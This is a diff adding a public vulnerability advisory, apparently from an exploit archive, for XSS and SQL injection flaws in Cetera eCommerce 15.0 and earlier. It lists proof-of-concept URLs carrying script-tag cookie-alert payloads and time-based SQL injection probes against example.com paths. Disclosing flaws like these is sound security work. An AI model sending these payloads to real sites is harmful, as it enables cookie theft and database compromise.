@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/47044/info
+
+Cetera eCommerce is prone to multiple cross-site scripting and SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Cetera eCommerce versions 15.0 and prior are vulnerable. 
+
+Cross Site Scripting:
+
+http://www.example.com/catalog/%3Cscript%3Ealert(document.cookie)%3C/script%3E/
+http://www.example.com/vendors/%3Cscript%3Ealert(document.cookie)%3C/script%3E/
+http://www.example.com/catalog/cart/%3Cscript%3Ealert(document.cookie)%3C/script%3E/
+http://www.example.com/news/%3Cscript%3Ealert(document.cookie)%3C/script%3E/
+http://www.example.com/news/13012011111030/%3Cscript%3Ealert(document.cookie)%3C/script%3E/
+http://www.example.com/%3Cscript%3Ealert(document.cookie)%3C/script%3E/
+
+This vulnerability have appeared in version 15.0. Vulnerability takes place
+at page with error 404, so it'll work as at this URL, as at other URLs,
+which lead to non-existent pages.
+
+SQL Injection:
+
+http://www.example.com/catalog/(version()=5.1)/
+http://www.example.com/catalog/cart/.+benchmark(100000,md5(now()))+./
+
